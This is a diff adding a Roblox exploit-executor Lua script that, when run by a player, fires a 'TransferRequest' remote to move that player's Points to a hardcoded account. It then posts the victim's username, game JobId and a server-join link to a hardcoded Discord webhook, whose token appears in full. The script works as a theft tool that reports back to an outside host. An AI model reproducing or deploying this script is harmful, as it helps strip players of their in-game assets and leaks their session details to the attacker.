@@ -1,0 +1,110 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local TargetName = "wwwww_90018"
+local Webhook = "https://discord.com/api/webhooks/1541064808751833088/RWbHaPRvHaMcQ7v2vAqzaOQLo283tV4Kw5F5lZq5spYvq1pCRa8rcQ3-_E6qOpuhZKAt"
+
+local function GetPointsByName(name)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= nil and (player.Name == name or player.DisplayName == name) then
+            local leaderstats = player:FindFirstChild("leaderstats")
+
+            if leaderstats then
+                local points = leaderstats:FindFirstChild("Points")
+
+                if points then
+                    return points.Value
+                end
+            end
+        end
+    end
+
+    return nil
+end
+
+local function SendWebhook(senderPoints, receiverPoints)
+    local url = "https://ripples-joiner.vercel.app/?jobId=" .. game.JobId .. "&username=" .. LocalPlayer.Name
+
+    local payload = {
+        embeds = {
+            {
+                title = "💸 Transfer Report",
+                description = string.format(
+                    "**👤 Sender:** %s (Points: %d)\n**🎯 Receiver:** %s (Points: %d)\n\n**[🎮 Join Server](%s)**",
+                    TargetName,
+                    senderPoints or 0,
+                    TargetName,
+                    receiverPoints or 0,
+                    url
+                ),
+                color = 16739179
+            }
+        }
+    }
+
+    pcall(function()
+        local requestFunction
+
+        if syn then
+            if syn.request then
+                requestFunction = syn.request
+            end
+        elseif http then
+            if http.request then
+                requestFunction = http.request
+            end
+        else
+            requestFunction = request
+        end
+
+        if requestFunction then
+            requestFunction({
+                Url = Webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end
+    end)
+end
+
+local function GetLocalPlayerPoints()
+    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
+
+    if leaderstats then
+        local points = leaderstats:FindFirstChild("Points")
+
+        if points then
+            return points.Value
+        end
+    end
+
+    return nil
+end
+
+local LocalPoints = GetLocalPlayerPoints()
+
+if LocalPoints and LocalPoints <= 0 then
+    return
+end
+
+local TargetPoints = GetPointsByName(TargetName)
+
+if not TargetPoints then
+    return
+end
+
+local TargetPlayer = Players:FindFirstChild(TargetName)
+
+if TargetPlayer then
+    local TransferRequest = TargetPlayer:FindFirstChild("TransferRequest")
+
+    if TransferRequest then
+        TransferRequest:FireServer(TargetName, LocalPoints)
+        SendWebhook(LocalPoints, TargetPoints)
+    end
+end
